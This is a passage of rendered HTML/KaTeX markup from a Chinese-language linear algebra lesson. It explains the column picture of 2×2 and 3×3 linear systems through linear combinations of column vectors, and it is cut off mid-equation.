fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">1\begin{bmatrix}2\\-1\end{bmatrix}+2\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>。<br>现在来看列图像，在二维平面上画出上面的列向量：</p><p>如图，绿向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">col_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与蓝向量（两倍的蓝绿向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）合成红向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>。</p><p>接着，我们继续观察<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\end{bmatrix}+y\begin{bmatrix}-1\\2\end{bmatrix}=\begin{bmatrix}0\\3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_1,col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的某种线性组合得到了向量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>c</mi><mi>o</mi><msub><mi>l</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">col_1,col_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的所有线性组合能够得到什么结果？它们将铺满整个平面。<br>下面进入三个未知数的方程组：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>x</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>2</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>z</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mn>4</mn><mi>z</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mn>4</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}2x&amp;-y&amp;&amp;=0\\-x&amp;+2y&amp;-z&amp;=-1\\&amp;-3y&amp;+4z&amp;=4\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">x</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">+</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，写作矩阵形式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo separator="true">,</mo><mtext> </mtext><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A=\begin{bmatrix}2&amp;-1&amp;0\\-1&amp;2&amp;-1\\0&amp;-3&amp;4\end{bmatrix},\ b=\begin{bmatrix}0\\-1\\4\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>。<br>在三维直角坐标系中，每一个方程将确定一个平面，而例子中的三个平面会相交于一点，这个点就是方程组的解。<br>同样的，将方程组写成列向量的线性组合，观察列图像：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>z</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" 